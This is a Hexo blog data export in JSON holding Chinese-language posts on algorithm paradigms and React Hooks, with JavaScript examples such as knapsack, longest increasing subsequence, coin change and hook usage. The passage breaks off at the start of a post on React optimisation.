{"meta":{"title":"Hexo","subtitle":"","description":"","author":"一枚小笨蛋","url":"https://xuxb.github.io","root":"/"},"pages":[{"title":"分类","date":"2021-04-27T09:20:32.000Z","updated":"2021-04-27T11:39:14.993Z","comments":false,"path":"categories/index.html","permalink":"https://xuxb.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2021-04-27T09:53:48.000Z","updated":"2021-04-27T11:39:16.496Z","comments":false,"path":"tags/index.html","permalink":"https://xuxb.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"算法范式 - 分支限界法","slug":"算法范式/算法范式 - 分支限界法","date":"2021-06-01T08:32:28.000Z","updated":"2021-06-07T11:29:49.390Z","comments":true,"path":"2021/06/01/算法范式/算法范式 - 分支限界法/","link":"","permalink":"https://xuxb.github.io/2021/06/01/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F%20-%20%E5%88%86%E6%94%AF%E9%99%90%E7%95%8C%E6%B3%95/","excerpt":"","text":"算法范式 - 分支限界法基本概念分支限界法是从根开始，常以广度优先或以最小耗费(最大效益)优先的方式搜索问题的解空间树。 首先将根结点加入活结点表(用于存放活结点的数据结构)，接着从活结点表中取出根结点，使其成为当前扩展结点，一次性生成其所有孩子结点，判断孩子结点是舍弃还是保留，舍弃那些导致不可行解或导致非最优解的孩子结点，其余的被保留在活结点表中。再从活结点表中取出一个活结点作为当前扩展结点，重复上述扩展过程，直到找到所需的解或活结点表为空时为止。 由此可见，每一个活结点最多只有-次机会成为扩展结点。活结点表的实现通常有两种形式: 一种是普通的队列，即先进先出队列 一种是优先级队列，按照某种优先级决定哪个结点为当前扩展结点，优先队列一般使用二叉堆来实现 最大堆实现最大优先队列，即优先级数值越大越优先，通常表示最大效益优先 最小堆实现最小优先队列，即优先级数值越小越优先，通常表示最小耗费优先 分支限界法也分为两种: 队列式分支限界法 优先队列式分支限界法 实现步骤 定义问题的解空间 确定问题的解空间组织结构 搜索解空间。搜索前要定义判断标准(约束函数或限界函数)，如果选用优先队列式分支限界法，则必须确定优先级。 回溯法与分支限界法的异同点相同点 均需要先定义问题的解空间，确定的解空间组织结构–般都是树或图。 在问题的解空间树上搜索问题解。 搜索前均需确定判断条件，该判断条件用于判断扩展生成的结点是否为可行结点。 搜索过程中必须判断扩展生成的结点是否满足判断条件，如果满足，则保留该扩展生成的结点，否则舍弃。 不同点 搜索目标: 回溯法的求解目标是找出解空间树中满足约束条件的所有解，而分支限界法的求解目标则是找出满足约束条件的一个解，或是在满足约束条件的解中找出在某种意义下的最优解。 搜索方式不同: 回溯法以深度优先的方式搜索解空间树，而分支限界法则以广度优先或以最小耗费优先的方式搜索解空间树。 扩展方式不同: 在回溯法搜索中，扩展结点一次生成一个孩子结点，而在分支限界法搜索中，扩展结点一次生成它所有的孩子结点。","categories":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}],"tags":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}]},{"title":"算法范式 - 分治法","slug":"算法范式/算法范式 - 分治法","date":"2021-06-01T08:32:28.000Z","updated":"2021-06-07T11:30:59.302Z","comments":true,"path":"2021/06/01/算法范式/算法范式 - 分治法/","link":"","permalink":"https://xuxb.github.io/2021/06/01/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F%20-%20%E5%88%86%E6%B2%BB%E6%B3%95/","excerpt":"","text":"算法范式 - 分治法概念当求解的问题较复杂或规模较大时，不能立刻得到原问题的解，但这些问题本身具有这样的特点，它可以分解为若干个与原问题性质相类似的子问题，而这些子问题较简单可方便得到它们的解，因此通过合并这些子问题的解就可得到原问题的解。 任何一个可以用计算机求解的问题所需的计算时间都与其规模有关。问题的规模越小，越容易直接求解，解题所需的计算时间也越少。例如，对于n个元素的排序问题，当n=1时，不需任何计算。n=2时，只要作一次比较即可排好序。n=3时只要作3次比较即可，…。而当n较大时，问题就不那么容易处理了。要想直接解决一个规模较大的问题，有时是相当困难的。 基本步骤 分解问题(divide)：把原问题分解为若干个与原问题性质相类似的子问题 求解子问题(conquer)：不断分解子问题直到可方便求出子问题的解为止 合并子问题的解(combine)：合并子问题的解得到原问题的解 使用场景 原问题可以分解为若干个与原问题性质相类似的子问题 问题的规模缩小到一定程度后可方便求出解 子问题的解可以合并得到原问题的解 分解出的各个子问题应相互独立，即不包含重叠子问题 案例题 有序数组查找（二分法） 求根号 快速排序、归并排序 1234567891011121314151617181920212223/** * 找到一个数字在指定精度内的平方根 * * @param num 数字 * @param pricision 精度 */function sqrt(num, pricision) &#123; let up = num &gt; 1 ? num : 1; let down = 0; let n; while(true) &#123; n = (down + up) / 2; if (n * n - num &lt;= pricision &amp;&amp; n * n - num &gt;= 0) break; if (n * n - num &gt; pricision) up = n; if (n * n - num &lt; 0) down = n; &#125; return n;&#125;sqrt(10, 0.001); // 3.162384033203125","categories":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}],"tags":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}]},{"title":"算法范式 - 动态规划","slug":"算法范式/算法范式 - 动态规划","date":"2021-06-01T08:32:28.000Z","updated":"2021-06-07T11:30:25.511Z","comments":true,"path":"2021/06/01/算法范式/算法范式 - 动态规划/","link":"","permalink":"https://xuxb.github.io/2021/06/01/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F%20-%20%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/","excerpt":"","text":"算法范式 - 动态规划动态规划是通过拆分问题，定义问题状态和状态之间的关系，使得问题能够以递推（或者分治）的方式去解决。 如何拆分问题，是动态规划的核心。而拆分问题，靠的就是状态的定义和状态转移方程的定义。 动态规划的特点： 把原来的问题分解成了几个相似的子问题； 所有的子问题都只需要解决一次； 储存子问题的解； 0 - 1 背包问题该问题可以描述为：给定一组物品，每种物品都有自己的重量和价格，在限定的总重量内，我们如何选择，才能使得物品的总价格最高。每个问题只能放入至多一次。 假设有以下物品： 物品重量 价值 1 3 2 7 3 12 对于这个问题来说，子问题就两个，分别是放物品和不放物品，可以通过以下表格来理解子问题 物品重量 / 剩余容量 0 1 2 3 4 5 1 0 3 3 3 3 3 2 0 3 7 10 10 10 3 0 3 7 12 15 19 直接来分析能放三种物品的情况，也就是最后一行 当容量少于 3 时，只取上一行对应的数据，因为当前容量不能容纳物品 3 当容量 为 3 时，考虑两种情况，分别为放入物品 3 和不放物品 3 不放物品 3 的情况下，总价值为 10 放入物品 3 的情况下，总价值为 12，所以应该放入物品 3 当容量 为 4 时，考虑两种情况，分别为放入物品 3 和不放物品 3 不放物品 3 的情况下，总价值为 10 放入物品 3 的情况下，和放入物品 1 的价值相加，得出总价值为 15，所以应该放入物品 3 当容量 为 5 时，考虑两种情况，分别为放入物品 3 和不放物品 3 不放物品 3 的情况下，总价值为 10 放入物品 3 的情况下，和放入物品 2 的价值相加，得出总价值为 19，所以应该放入物品 3 1234567891011121314151617181920212223242526272829303132/** * @param &#123;*&#125; w 物品重量 * @param &#123;*&#125; v 物品价值 * @param &#123;*&#125; C 总容量 * @returns */function fn(w, v, c) &#123; let array = new Array(w.length); // 完成底部子问题的解 array[0] = []; for (let j = 0; j &lt;= c; j++) &#123; array[0][j] = j &gt;= w[0] ? v[0] : 0; &#125; // 自底向上开始解决子问题，从物品 2 开始 for (let i = 1; i &lt; w.length; i++) &#123; array[i] = []; for (let j = 0; j &lt;= c; j++) &#123; array[i][j] = array[i - 1][j]; if (j &gt;= w[i]) &#123; array[i][j] = Math.max(array[i][j], v[i] + array[i - 1][j - w[i]]); &#125; &#125; &#125; console.log(array); // [[0, 3, 3, 3, 3, 3], ​​​​​​​​​​[0, 3, 7, 10, 10, 10], ​​​​​​​​​​[0, 3, 7, 12, 15, 19]]​​​​​ return array[w.length - 1][c];&#125;fn([1, 2, 3], [3, 7, 12], 5); 最长递增子序列最长递增子序列意思是在一组数字中，找出最长一串递增的数字，比如 0, 3, 4, 17, 2, 8, 6, 10，对于以上这串数字来说，最长递增子序列就是 0, 3, 4, 8, 10 设F{k}为以数列中第 k 项结尾的最长递增子序列的长度，则第 k 项结尾的LIS的长度是：保证第 i 项比第 k 项小的情况下，以第 i 项结尾的 LIS 长度加 1 的最大值，取遍i的所有值（i小于k）。 数字 0 3 4 17 2 8 6 10 长度 1 2 3 4 2 4 4 5 通过以上表格可以很清晰的发现一个规律，遍历找出刚好比当前数字小的数，并且在小的数组成的长度基础上加 1。 12345678910111213141516171819function list(arr) &#123; if (!Array.isArray(arr)) return 0; const res = new Array(arr.length).fill(1); for (let i = 1; i &lt; arr.length; i++) &#123; for (let j = 0; j &lt; i; j++) &#123; if (arr[i] &gt; arr[j]) &#123; res[i] = Math.max(res[i], res[j] + 1); &#125; &#125; &#125; return Math.max(...res);&#125;list([1, 7, 2, 8, 3, 4]); // 4list([0, 3, 4, 17, 2, 8, 6, 10]); // 5 纸币找零12345678910111213141516171819202122232425262728293031function MinCoinChange(coins) &#123; var coins = coins; //&#123;1&#125; var cache = &#123;&#125;; //&#123;2&#125; MinCoinChange.prototype.makeChange = function (amount) &#123; if (!amount) return []; if (cache[amount]) return cache[amount]; var min = [], newMin, newAmount; for (var i = 0; i &lt; coins.length; i++) &#123; //&#123;5&#125; var coin = coins[i]; newAmount = amount - coin; //&#123;6&#125; if (newAmount &gt;= 0) newMin = this.makeChange(newAmount); //&#123;7&#125; if ( newAmount &gt;= 0 &amp;&amp; //&#123;8&#125; (newMin.length &lt; min.length - 1 || !min.length) //&#123;9&#125; &amp;&amp; (newMin.length || !newAmount) //&#123;10&#125; ) &#123; min = [coin].concat(newMin); //&#123;11&#125; console.log(&#x27;new Min &#x27; + min + &#x27; for &#x27; + amount); &#125; &#125; return (cache[amount] = min); //&#123;12&#125; &#125;;&#125;var minCoinChange = new MinCoinChange([1, 5, 10, 25]);console.log(minCoinChange.makeChange(36)); 斐波那契数列 背包问题 最长递增子序列 纸币找零 台阶问题 国王与金矿","categories":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}],"tags":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}]},{"title":"算法范式 - 回溯法","slug":"算法范式/算法范式 - 回溯法","date":"2021-06-01T08:32:28.000Z","updated":"2021-06-07T11:29:52.559Z","comments":true,"path":"2021/06/01/算法范式/算法范式 - 回溯法/","link":"","permalink":"https://xuxb.github.io/2021/06/01/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F%20-%20%E5%9B%9E%E6%BA%AF%E6%B3%95/","excerpt":"","text":"算法范式 - 回溯法基本概念回溯法（探索与回溯法）是一种选优搜索法，又称为试探法，按选优条件向前搜索，以达到目标。但当探索到某一步时，发现原先选择并不优或达不到目标，就退回一步重新选择，这种走不通就退回再走的技术为回溯法，而满足回溯条件的某个状态的点称为“回溯点”。 回溯法本质上是一种深度优先的算法 对于回溯法，一个解的各个部分是逐步生成的，当发现当前生成的某部分不满足约束条件时，就放弃该步所做的工作，退到上一步进行新的尝试，而不是放弃整个解重来。 特点回溯法可以系统地搜索一个问题的所有解或任一解.回溯法是一个既带系统性又带跳跃性的搜索算法.回溯法是解决较为复杂枚举题的一种常用算法. 实现步骤 应明确定义问题的解空间，包含一个或多个解； 从根结点出发，以深度优先方式搜索整个解空间； 搜索解答树时，要采用一定策略进行剪枝，避免无效搜索，来提高效率； 用约束函数剪去不满足条件的子树 用限界函数剪去得不到最优解的子树 123456789101112// 通用递归回溯框架function backtrack(t) &#123; if (t &gt; n) &#123; output(x); &#125; else &#123; for (i = f(n, t); i &lt;= g(n, t); ++i) &#123; x[t] = h(i); if (Constrain(t) &amp;&amp; Bound(t)) backtrack(t + 1); &#125; &#125;&#125;","categories":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}],"tags":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}]},{"title":"算法范式 - 贪心算法","slug":"算法范式/算法范式 - 贪心算法","date":"2021-06-01T08:32:28.000Z","updated":"2021-06-07T11:30:00.125Z","comments":true,"path":"2021/06/01/算法范式/算法范式 - 贪心算法/","link":"","permalink":"https://xuxb.github.io/2021/06/01/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F%20-%20%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/","excerpt":"","text":"算法范式 - 贪心算法基本概念所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，所做出的仅是在某种意义上的局部最优解。 贪心算法没有固定的算法框架，算法设计的关键是贪心策略的选择。必须注意的是，贪心算法不是对所有问题都能得到整体最优解，选择的贪心策略必须具备无后效性，即某个状态以后的过程不会影响以前的状态，只与当前状态有关。所以对所采用的贪心策略一定要仔细分析其是否满足无后效性。 贪心算法的基本思路 建立数学模型来描述问题。 把求解的问题分成若干个子问题。 对每一子问题求解，得到子问题的局部最优解。 把子问题的解局部最优解合成原来解问题的一个解。贪心算法适用的问题贪心策略适用的前提是：局部最优策略能导致产生全局最优解。实际上，贪心算法适用的情况很少。一般，对一个问题分析是否适用于贪心算法，可以先选择该问题下的几个实际数据进行分析，就可做出判断。 课程安排问题 小船过河问题 分糖果问题","categories":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/categories/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}],"tags":[{"name":"算法范式","slug":"算法范式","permalink":"https://xuxb.github.io/tags/%E7%AE%97%E6%B3%95%E8%8C%83%E5%BC%8F/"}]},{"title":"React Hooks","slug":"React/React Hooks","date":"2021-05-26T08:32:38.000Z","updated":"2021-06-07T11:46:58.019Z","comments":true,"path":"2021/05/26/React/React Hooks/","link":"","permalink":"https://xuxb.github.io/2021/05/26/React/React%20Hooks/","excerpt":"","text":"React HooksHooks 是辅助 Function Component 的一种工具，用于管理函数组件的状态、生命周期、副作用等 1. useState1.1 使用方式1234567891011121314151617181920212223const App = () =&gt; &#123; const [count, setCount] = useState(0) const [name, setName] = useState(&#x27;Jack&#x27;) const [age, setAge] = useState(18) const onClick = () =&gt; &#123; setCount(count + 1) setAge(age + 1) &#125; return ( &lt;&gt; &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt; &lt;p&gt;Your age is &#123;age&#125;&lt;/p&gt; &lt;p&gt;Your name is &#123;name&#125;&lt;/p&gt; &lt;button onClick=&#123;onClick&#125;&gt; Click me &lt;/button&gt; &lt;/&gt; )&#125;export default App 在 Class Component 中通过 this.state 方式读取 state，每次执行都会拿到最新的 state 引用，而 Function Component 中不是通过 this. 的方式获取到的 state，而是当时渲染闭包环境的 state 数据，所以取到的值依然是旧的渲染值 说明：每次调用 setCount、setAge 时都会重新执行整个函数式组件，包括初始化数据，调用 useState、useEffect，注册事件等，最后返回 VNode 对象（每次重新 render 组件时取出来的 state 是缓存中的值，即上一次 state 的值或初始值） useState 的初始值只在第一次渲染时有效，之后从 state 中取出的值都是缓存的值 1.2 实现原理1234567891011121314// useState 基本实现原理let memoizedState = [] // hooks 的值存放在这个数组里let cursor = 0 // 当前 memoizedState 的索引function useState(initialValue) &#123; memoizedState[cursor] = memoizedState[cursor] || initialValue const currentCursor = cursor function setState(newState) &#123; memoizedState[currentCursor] = newState cursor = 0 render(&lt;App /&gt;, document.getElementById(&#x27;root&#x27;)) &#125; return [memoizedState[cursor++], setState] // 返回当前 state，并把 cursor 加 1&#125; useState 原理 初次渲染时，每次 useState 执行时都会将对应的 setState 绑定到对应索引的位置（用于更新指定的 state），然后将初始 state 存入 memoizedState 中 触发 setCount 和 setAge 时，每个 setState 都有其对应索引的引用，因此触发对应的 setState 会改变对应位置的 state 的值 每次执行 setState 都有一次重新渲染的过程，将 cursor 重置为 0，重新按顺序取得 state 里面的值（已缓存上一次 state 里的值） Hooks 需要确保 Hook 在每一次渲染中都按照同样的顺序被调用，因为 memoizedState 是按 Hooks 定义的顺序来放置数据的，如果 Hooks 的顺序变化，memoizedState 并不会感知到。所以最好每次只在最顶层使用 Hook，不要在循环、条件、嵌套函数中调用 Hooks。 useState 返回更新 state 的函数与 class 组件的 this.setState 不同，它不会把新的 state 和旧的 state 进行合并，而是直接替换，相当于直接返回一个新的对象 每次 setState 后都会重新渲染，渲染时的 state、props、useEffect、事件处理函数都是独立的，获取到的值是此次 rerender 时的数据 利用 useRef 就可以绕过 Capture Value 的特性。可以认为 ref 在所有 Render 过程中保持着唯一引用，因此所有对 ref 的赋值或取值，拿到的都只有一个最终状态，而不会在每个 Render 间存在隔离 2. useEffectuseEffect 在每次 render 执行完后再执行，用于处理数据副操作，用于在函数组件里实现 class 的生命周期 useEffect(() =&gt; {}): 每次 render 后执行，类似于 componentDidUpdate useEffect(() =&gt; { return cleanUpFn }，[]): 挂载后执行一次，销毁时执行一次 cleanupFn，功能类似于 componentDidMount 和 componentWillUnmount useEffect(() =&gt; {}，[state1, state2]): 每次 state1 或 state2 变化后执行，功能类似于 Vue 中的 watch 在第一次渲染之后和每次更新之后都会执行，可以根据依赖项进行控制，执行顺序为 setState –&gt; render –&gt; useEffectuseEffect 里面使用到的 state 的值, 固定在了 useEffect 内部（闭包环境），引用地址不会再变化 12345678910useEffect(() =&gt; &#123; const timer = setInterval(() =&gt; &#123; console.log(&#x27;---&#x27;) &#125;, 1000) return () =&gt; &#123; clearInterval(timer) &#125;&#125;,[]) 必须将 函数 写在 useEffect 内部，这样 eslint-plugin-react-hooks 才能通过静态分析补齐依赖项 所有函数都写在 useEffect 内部会导致难以维护，可以使用 useCallback 12345678910111213function Counter() &#123; const [count, setCount] = useState(0); const getFetchUrl = useCallback(() =&gt; &#123; return &#x27;https://v?query=&#x27; + count; &#125;, [count]); useEffect(() =&gt; &#123; getFetchUrl(); &#125;, [getFetchUrl]); return &lt;h1&gt;&#123;count&#125;&lt;/h1&gt;;&#125; 3. useRefuseRef 可以用于访问 DOM 节点、React 组件实例或作为容器保存可变变量 useRef 返回一个可变的 ref 对象，其 .current 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的整个生命周期内保持不变。通过 current 属性可以访问到 DOM 节点 123456789101112function TextInputWithFocusButton() &#123; const inputEl = useRef(null); const onButtonClick = () =&gt; &#123; inputEl.current.focus(); // `current` 指向已挂载到 DOM 上的文本输入元素 &#125;; return ( &lt;&gt; &lt;input ref=&#123;inputEl&#125; type=&quot;text&quot; /&gt; &lt;button onClick=&#123;onButtonClick&#125;&gt;Focus the input&lt;/button&gt; &lt;/&gt; );&#125; 12345678// 获取上一轮的 props 或 statefunction usePrevious(value) &#123; const ref = useRef(); // 此处的 ref 相当于是全局变量，re-render 时并不会被回收 useEffect(() =&gt; &#123; ref.current = value; &#125;); return ref.current;&#125; 4.useMemo用于缓存值，避免在每次渲染时都进行高开销的计算 const memoizedValue = useMemo(() =&gt; computeExpensiveValue(a, b), [a, b]); 用于缓存值，把 “创建” 函数和依赖项数组作为参数传入 useMemo，它仅会在某个依赖项改变时才重新计算 memoized 值。这种优化有助于避免在每次渲染时都进行高开销的计算。类似于 Vue 中的 computed 属性。 函数组件里的某一个 state 变化时，都会重新执行整个函数并渲染，逻辑从上到下重新执行一遍 1234567891011121314151617181920212223export default function WithMemo() &#123; const [count, setCount] = useState(1); const [val, setValue] = useState(&#x27;&#x27;); // 缓存了昂贵的计算 const expensive = useMemo(() =&gt; &#123; console.log(&#x27;compute&#x27;); let sum = 0; for (let i = 0; i &lt; count * 100; i++) &#123; sum += i; &#125; return sum; &#125;, [count]); return ( &lt;div&gt; &lt;h4&gt;&#123;count&#125;-&#123;expensive&#125;&lt;/h4&gt; &lt;div&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+c1&lt;/button&gt; &lt;input value=&#123;val&#125; onChange=&#123;event =&gt; setValue(event.target.value)&#125; /&gt; &lt;/div&gt; &lt;/div&gt; );&#125; 5. useCallbackconst memoizedCb = useMemo(() =&gt; doSomething(a, b), [a, b]); 用于缓存函数，返回一个 memoized 回调函数，根据依赖项来决定是否更新函数 在 class component 中通过 shouldComponentUpdate 或 getDerivedStateFromProps 中判断前后的 props 和 state，如果没有变化，则阻止更新，而 16.8 版本前的 function component 没有生命周期钩子用来优化性能，且函数组件每次调用都会执行其内部环境的所有逻辑，因此用 useMemo 和 useCallback 处理优化性能问题。 把内联回调函数及依赖项数组作为参数传入 useCallback，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会更新。当你把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。 React.memo 为高阶组件。它与 React.PureComponent 非常相似，但只适用于函数组件，而不适用 class 组件，能对props做浅比较，防止组件无效的重复渲染 有一个父组件，其中包含子组件，子组件接收一个函数作为 props；通常而言，如果父组件更新了，子组件也会执行更新；但是大多数场景下，更新是没有必要的，我们可以借助useCallback来返回函数，然后把这个函数作为props传递给子组件；这样，子组件就能避免不必要的更新。 例如：父组件传递一个函数给子组件的时候，由于父组件的更新会导致该函数重新生成从而传递给子组件的函数引用发生了变化，这就会导致子组件也会更新，而很多时候子组件的更新是没必要的，所以我们可以通过 useCallback 来缓存该函数，然后传递给子组件，用于减少子组件不必要的重新渲染。 note: useCallback 需与 memo 结合使用，否则没有意义 12345function useFetch(count, step) &#123; return useCallback(() =&gt; &#123; const url = &quot;https://v/search?query=&quot; + count + &quot;&amp;step=&quot; + step; &#125;, [count, step]);&#125; 1234567891011121314151617181920212223242526272829// 父组件const Parent = () =&gt; &#123; const [count, setCount] = useState(1); const [val, setVal] = useState(&#x27;&#x27;); const callback = useCallback(() =&gt; &#123; return count; &#125;, [count]); return ( &lt;div&gt; &lt;h4&gt;&#123;count&#125;&lt;/h4&gt; &lt;Child callback=&#123;callback&#125; /&gt; &lt;div&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+&lt;/button&gt; &lt;input value=&#123;val&#125; onChange=&#123;event =&gt; setVal(event.target.value)&#125; /&gt; &lt;/div&gt; &lt;/div&gt; );&#125;// 子组件const Child = (&#123; callback &#125;) =&gt; &#123; const [count, setCount] = useState(() =&gt; callback()); useEffect(() =&gt; &#123; setCount(callback()); &#125;, [callback]); return &lt;div&gt;&#123;count&#125;&lt;/div&gt;&#125;export default React.memo(Child) // 用React.memo包裹 5.1 何时使用 useMemo、useCallback 需要保持对象、函数的引用地址相等（核心） 对于组件内部用到的 object、array、函数等，如果用在了其他 Hook 的依赖数组中，或者作为 props 传递给了下游组件，应该使用 useMemo 和 useCallback 自定义 Hook 中暴露出来的 object、array、函数等，都应该使用useMemo 和 useCallback,以确保当值相同时，引用不发生变化 React.memo 和 React.PureComponent 类似， React.PureComponent 在类组件中使用，而 React.memo 在函数组件中使用 12345678910111213141516171819202122232425262728293031// 父组件const Parent = () =&gt; &#123; const [count, setCount] = useState(1); const [val, setVal] = useState(&#x27;&#x27;); const callback = useCallback(() =&gt; &#123; return count; &#125;, [count]); return ( &lt;div&gt; &lt;h4&gt;&#123;count&#125;&lt;/h4&gt; &lt;Child callback=&#123;callback&#125; /&gt; &lt;div&gt; &lt;button onClick=&#123;() =&gt; setCount(count + 1)&#125;&gt;+&lt;/button&gt; &lt;input value=&#123;val&#125; onChange=&#123;event =&gt; setVal(event.target.value)&#125; /&gt; &lt;/div&gt; &lt;/div&gt; );&#125;// 子组件const Child = (&#123; callback &#125;) =&gt; &#123; const [count, setCount] = useState(() =&gt; callback()); useEffect(() =&gt; &#123; setCount(callback()); &#125;, [callback]); return &lt;div&gt;&#123;count&#125;&lt;/div&gt;);&#125;export default React.memo(Child) // 用React.memo包裹 6. useContext接收一个 context 对象（React.createContext 的返回值）并返回该 context 的当前值。 12// initContext 可以为基础数据类型、对象或者函数const context = React.useContext(React.createContext(initContext)) 当前的 context 值由上层组件中距离当前组件最近的 &lt;MyContext.Provider&gt; 的 value prop 决定，如果 &lt;MyContext.Provider&gt; 没有提供 value prop，则 context 中获取到的值为 React.createContext(initContext) 中的 initContext 值 当 &lt;MyContext.Provider&gt; 更新时，该 Hook 会触发重渲染，并使用最新传递给 MyContext provider 的 context value 值 7. useReducer1const [state, dispatch] = useReducer(reducer, initialArg, init); 在某些场景下，useReducer 会比 useState 更适用，例如 state 逻辑较复杂且包含多个子值，或者下一个 state 依赖于之前的 state 等。并且，使用 useReducer 还能给那些会触发深更新的组件做性能优化，因为你可以向子组件传递 dispatch 而不是回调函数 React 会确保 dispatch 函数的标识是稳定的，并且不会在组件重新渲染时改变。这就是为什么可以安全地从 useEffect 或 useCallback 的依赖列表中省略 dispatch 1234567891011121314151617181920212223const reducer =(state = 0, &#123;type&#125;)=&gt;&#123; switch (type) &#123; case &#x27;add&#x27;: return state+1 case &#x27;delete&#x27;: return state-1 default: return state; &#125;&#125;const Hook =()=&gt;&#123; const [count, dispatch] = useReducer(reducer, 0) return( &lt;div&gt; count:&#123;count&#125; &lt;button onClick=&#123;()=&gt; dispatch(&#123;type:&#x27;add&#x27;&#125;)&#125;&gt;add&lt;/button&gt; &lt;button onClick=&#123;()=&gt; dispatch(&#123;type:&#x27;delete&#x27;&#125;)&#125;&gt;delete&lt;/button&gt; &lt;/div&gt; )&#125;export default Hook 8. 自定义 hooks当触发 resize 事件时，自动更新 width、height 12345678910111213141516171819202122232425262728import &#123; useEffect, useState &#125; from &#x27;react&#x27;;export const useWindowSize = () =&gt; &#123; const [width, setWidth] = useState() const [height, setHeight] = useState() useEffect(() =&gt; &#123; const &#123; clientWidth, clientHeight &#125; = document.documentElement setWidth(clientWidth) setHeight(clientHeight) &#125;, []) useEffect(() =&gt; &#123; const handleWindowSize = () =&gt; &#123; const &#123; clientWidth, clientHeight &#125; = document.documentElement setWidth(clientWidth) setHeight(clientHeight) &#125;; window.addEventListener(&#x27;resize&#x27;, handleWindowSize, false) return () =&gt; &#123; window.removeEventListener(&#x27;resize&#x27;, handleWindowSize, false) &#125; &#125;) return &#123; width, height &#125;&#125; 9. 全局状态管理（useContext + useReducer） 定义 reducer 函数、初始 state 值，通过 useReducer(reducer, state) 生成 state 和 dispatch 父组件通过 &lt;Context.Provider&gt; 将 state 数据、dispatch 函数提供给 context 子孙组件通过 useContext() 获取到 state、dispatch 子孙组件通过 state 数据绑定到 VNode、触发事件时调用 dispatch 函数 123456789101112131415161718192021222324252627282930313233343536373839// store.jsimport React, &#123; createContext, useContext, useReducer &#125; from &#x27;react&#x27;;const StoreContext = createContext();const initialState = &#123;count: 0, message: &#x27;&#125;;const reducer = (state, action) =&gt; &#123; switch(action.type) &#123; case &#x27;increment&#x27;: return &#123; count: state.count + 1, message: action.message &#125; case &#x27;decrement&#x27;: return &#123; count: state.count - 1, message: action.message &#125; case &#x27;reset&#x27;: return &#123; count: 0, message: action.message &#125; default: throw new Error(`Unhandled action type: $&#123;action.type&#125;`); &#125;&#125;export const StoreProvider = (&#123; children &#125;) =&gt; &#123; const [state, dispatch] = useReducer(reducer, initialState); return ( &lt;StoreContext.Provider value=&#123;&#123;state, dispatch&#125;&#125;&gt; &#123;children&#125; &lt;/StoreContext.Provider&gt; )&#125;export const useStore = () =&gt; useContext(StoreContext); 12345678910111213141516// index.jsimport React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;import &#123; StoreProvider &#125; from &#x27;./store&#x27;;import &#123; ChildComponent &#125; from &#x27;./childComponent&#x27;;function App() &#123; return ( &lt;StoreProvider&gt; &lt;ChildComponent/&gt; &lt;/StoreProvider&gt; );&#125;const rootElement = document.getElementById(&#x27;root&#x27;);ReactDOM.render(&lt;App /&gt;, rootElement); 1234567891011121314151617// childComponent.jsimport React from &#x27;react&#x27;;import &#123; useStore &#125; from &#x27;./store&#x27;;export const ChildComponent = () =&gt; &#123; const &#123;state, dispatch&#125; = useStore(); return ( &lt;div&gt; &#123;state.count&#125; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &#x27;increment&#x27;, message:&#x27;Incremented&#x27;&#125;)&#125;&gt;+&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &#x27;decrement&#x27;, message: &#x27;Decremented&#x27;&#125;)&#125;&gt;-&lt;/button&gt; &lt;button onClick=&#123;() =&gt; dispatch(&#123;type: &#x27;reset&#x27;, message: &#x27;Reset&#x27;&#125;)&#125;&gt;Reset&lt;/button&gt; &#123;state.message&#125; &lt;/div&gt; )&#125;","categories":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/categories/React/"}],"tags":[{"name":"React","slug":"React","permalink":"https://xuxb.github.io/tags/React/"}]},{"title":"React 优化","slug":"React/React 优化","date":"2021-05-26T08:32:38.000Z","updated":"2021-06-07T11:46:32.131Z","comments":true,"path":"2021/05/26/React/React 优化/","link":"","permalink":"https://xuxb.github.io/2021/05/26/React/React%20%E4%BC%98%E5%8C%96/","excerpt":"","text":"React 优化使用 